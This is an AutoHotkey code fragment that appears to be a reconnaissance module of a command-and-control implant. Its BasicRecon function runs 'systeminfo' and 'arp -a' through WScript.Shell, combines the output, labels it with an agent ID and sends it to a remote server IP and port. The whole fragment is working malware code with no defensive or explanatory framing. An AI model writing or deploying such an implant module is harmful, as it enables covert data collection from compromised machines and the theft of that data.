; ============================================================================
; BASIC RECONNAISSANCE MODULE
; ============================================================================
; Collects basic system information including systeminfo and ARP table
; ============================================================================

BasicRecon() {
    ; Create shell
    shell := ComObject("WScript.Shell")

    ; Array to store command outputs
    results := []

    ; Commands to run
    commands := ["systeminfo", "arp -a"]
    labels := ["System Information", "ARP Information"]

    ; Run each command and store output
    Loop commands.Length {
        exec := shell.Exec("%ComSpec% /c " commands[A_Index])
        results.Push({
            label: labels[A_Index],
            output: exec.StdOut.ReadAll()
        })
    }

    ; Combine all results with labels
    combinedOutput := ""
    For data in results {
        combinedOutput .= data.label ":`r`n" data.output "`r`n`r`n"
    }

    message := Format("command_output|{}|{}", this.agentID, combinedOutput)
    response := this.SendMsg(this.serverIP, this.serverPort, message)

    return true
}
